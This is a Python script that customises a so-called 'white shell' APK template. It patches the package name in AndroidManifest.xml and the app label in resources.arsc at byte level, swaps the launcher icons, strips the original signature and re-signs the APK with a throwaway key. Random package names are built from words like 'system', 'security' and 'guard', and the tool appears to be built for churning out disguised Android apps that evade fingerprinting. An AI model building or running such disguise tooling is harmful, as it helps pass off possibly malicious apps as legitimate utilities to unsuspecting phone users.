#!/usr/bin/env python3
"""
定制化白壳 - 二进制替换法（绕过apktool）
直接在ZIP中替换AndroidManifest.xml和resources.arsc的字节
"""
import os
import sys
import random
import string
import zipfile
import subprocess
from PIL import Image
from io import BytesIO

def random_package_name(target_length=None):
    """生成随机包名（可指定目标长度以保证等长替换）"""
    domains = ['com', 'net', 'org']
    words = ['system', 'security', 'service', 'manager', 'helper', 'tools',
             'safe', 'guard', 'protect', 'clean', 'speed', 'power', 'battery',
             'wifi', 'network', 'device', 'mobile', 'android', 'app']

    if target_length:
        # 生成等长包名：com.xxxxx.yyyyy (固定3+1+剩余)
        # 例如: com.ninja.magic.safe (20) -> com.xxxxx.yyyyy (20)
        remaining = target_length - 4  # 减去 "com."
        if remaining < 3:
            raise ValueError(f"目标长度太短: {target_length}")

        # 分成两段，中间加点
        half = remaining // 2
        part1_len = remaining - half - 1  # 减去中间的点
        part2_len = half

        part1 = ''.join(random.choices(string.ascii_lowercase, k=part1_len))
        part2 = ''.join(random.choices(string.ascii_lowercase, k=part2_len))
        return f"com.{part1}.{part2}"
    else:
        # 默认随机生成
        domain = random.choice(domains)
        w1 = random.choice(words)
        w2 = random.choice(words)
        suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
        return f"{domain}.{w1}.{w2}.{suffix}"

def get_apk_info(apk_path):
    """提取APK的包名和应用名"""
    try:
        result = subprocess.run(
            ['aapt', 'dump', 'badging', apk_path],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.split('\n')

        pkg_name = None
        app_name = None

        for line in lines:
            if line.startswith('package: name='):
                pkg_name = line.split("name='")[1].split("'")[0]
            elif line.startswith('application-label:'):
                app_name = line.split("'")[1]

        return pkg_name, app_name
    except Exception as e:
        print(f"[WARN] 无法提取APK信息: {e}")
        return None, None

def customize_shell(template_apk, output_apk, app_name=None, icon_path=None, package_name=None):
    """
    定制化白壳APK - 二进制替换法

    Args:
        template_apk: 原始白壳模板
        output_apk: 输出APK
        app_name: 应用名称
        icon_path: 图标路径
        package_name: 包名（None=自动随机）
    """
    print(f"[CUSTOMIZE] 开始定制白壳（二进制替换法）...")

    # 1. 提取模板的原始包名和应用名
    orig_pkg, orig_app = get_apk_info(template_apk)
    if not orig_pkg:
        raise Exception("无法提取模板APK信息")

    print(f"[CUSTOMIZE] 模板包名: {orig_pkg}")
    print(f"[CUSTOMIZE] 模板应用名: {orig_app}")

    # 2. 生成目标包名（如果未指定）
    if not package_name:
        package_name = random_package_name(target_length=len(orig_pkg))
    print(f"[CUSTOMIZE] 目标包名: {package_name}")

    if app_name:
        print(f"[CUSTOMIZE] 目标应用名: {app_name}")

    # 3. 准备图标（如果提供）
    icon_sizes = {}
    if icon_path and os.path.exists(icon_path):
        try:
            img = Image.open(icon_path).convert('RGBA')
            size_map = {
                'mdpi': 48, 'hdpi': 72, 'xhdpi': 96,
                'xxhdpi': 144, 'xxxhdpi': 192,
            }
            for density, size in size_map.items():
                resized = img.resize((size, size), Image.LANCZOS)
                buf = BytesIO()
                resized.save(buf, format='PNG')
                icon_sizes[density] = buf.getvalue()
            print(f"[CUSTOMIZE] 图标已缩放: {len(icon_sizes)} 个尺寸")
        except Exception as e:
            print(f"[CUSTOMIZE] ⚠ 图标处理失败: {e}")

    # 4. 重打包APK
    print(f"[CUSTOMIZE] 正在重打包...")
    unsigned_path = output_apk + '.unsigned'

    with zipfile.ZipFile(template_apk, 'r') as zin:
        with zipfile.ZipFile(unsigned_path, 'w', zipfile.ZIP_STORED) as zout:
            for info in zin.infolist():
                item = info.filename
                data = zin.read(item)

                # 替换 AndroidManifest.xml 中的包名
                if item == 'AndroidManifest.xml' and package_name and orig_pkg:
                    old_u = orig_pkg.encode('utf-16-le')
                    new_u = package_name.encode('utf-16-le')
                    if len(new_u) == len(old_u) and old_u in data:
                        count = data.count(old_u)
                        data = data.replace(old_u, new_u)
                        print(f"[CUSTOMIZE]   AndroidManifest.xml: {orig_pkg} → {package_name} ({count}处)")
                    elif len(new_u) != len(old_u):
                        print(f"[CUSTOMIZE]   ⚠ 包名长度不等，跳过替换")

                # 替换 resources.arsc 中的应用名
                if item == 'resources.arsc' and app_name and orig_app:
                    for enc_name, old_bytes, new_bytes in [
                        ('UTF-8', orig_app.encode('utf-8'), app_name.encode('utf-8')),
                        ('UTF-16', orig_app.encode('utf-16-le'), app_name.encode('utf-16-le')),
                    ]:
                        if old_bytes not in data:
                            continue
                        count = data.count(old_bytes)
                        if len(old_bytes) == len(new_bytes):
                            data = data.replace(old_bytes, new_bytes)
                        elif len(new_bytes) < len(old_bytes):
                            # 补齐空字节
                            padded = new_bytes + b'\x00' * (len(old_bytes) - len(new_bytes))
                            data = data.replace(old_bytes, padded)
                        else:
                            # 新字符串更长 - 跳过替换，避免截断
                            print(f"[CUSTOMIZE]   ⚠ {enc_name}应用名过长({len(new_bytes)}B > {len(old_bytes)}B)，跳过")
                            continue
                        print(f"[CUSTOMIZE]   resources.arsc/{enc_name}: {orig_app} → {app_name} ({count}处)")

                    # resources.arsc 必须用 STORED
                    new_info = zipfile.ZipInfo(item)
                    new_info.compress_type = zipfile.ZIP_STORED
                    new_info.date_time = info.date_time
                    zout.writestr(new_info, data)
                    continue

                # 替换图标
                if icon_sizes and 'mipmap' in item and 'ic_launcher' in item and item.endswith('.png'):
                    for density, icon_data in icon_sizes.items():
                        if density in item:
                            data = icon_data
                            print(f"[CUSTOMIZE]   替换图标: {item}")
                            break

                # 跳过旧签名
                if item.startswith('META-INF/') and (
                    item.endswith('.SF') or item.endswith('.RSA') or
                    item.endswith('.DSA') or item.endswith('.MF')):
                    continue

                # 写入文件
                new_info = zipfile.ZipInfo(item)
                new_info.compress_type = info.compress_type
                new_info.date_time = info.date_time
                zout.writestr(new_info, data)

    print(f"[CUSTOMIZE] 未签名APK: {unsigned_path}")

    # 5. 签名
    print(f"[CUSTOMIZE] 正在签名...")
    sign_apk(unsigned_path, output_apk)

    if os.path.exists(unsigned_path):
        os.remove(unsigned_path)

    print(f"[CUSTOMIZE] ✓ 定制完成: {output_apk}")
    return output_apk, package_name

def sign_apk(unsigned_apk, signed_apk):
    """签名APK"""
    # 生成临时keystore
    import tempfile
    keystore = tempfile.mktemp(suffix='.jks')
    alias = 'key0'
    password = 'password'

    try:
        # 生成keystore
        cmd = [
            'keytool', '-genkey', '-v',
            '-keystore', keystore,
            '-alias', alias,
            '-keyalg', 'RSA',
            '-keysize', '2048',
            '-validity', '10000',
            '-storepass', password,
            '-keypass', password,
            '-dname', 'CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, S=Unknown, C=Unknown'
        ]
        subprocess.run(cmd, capture_output=True, check=True)

        # 签名
        cmd = [
            'apksigner', 'sign',
            '--ks', keystore,
            '--ks-key-alias', alias,
            '--ks-pass', f'pass:{password}',
            '--key-pass', f'pass:{password}',
            '--out', signed_apk,
            unsigned_apk
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"签名失败: {result.stderr}")

        print(f"[CUSTOMIZE] ✓ 签名完成")
    finally:
        if os.path.exists(keystore):
            os.remove(keystore)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--template', required=True, help='原始白壳')
    parser.add_argument('--output', required=True, help='输出APK')
    parser.add_argument('--name', help='应用名')
    parser.add_argument('--icon', help='图标路径')
    parser.add_argument('--package', help='包名（留空自动随机）')

    args = parser.parse_args()

    customize_shell(args.template, args.output, args.name, args.icon, args.package)
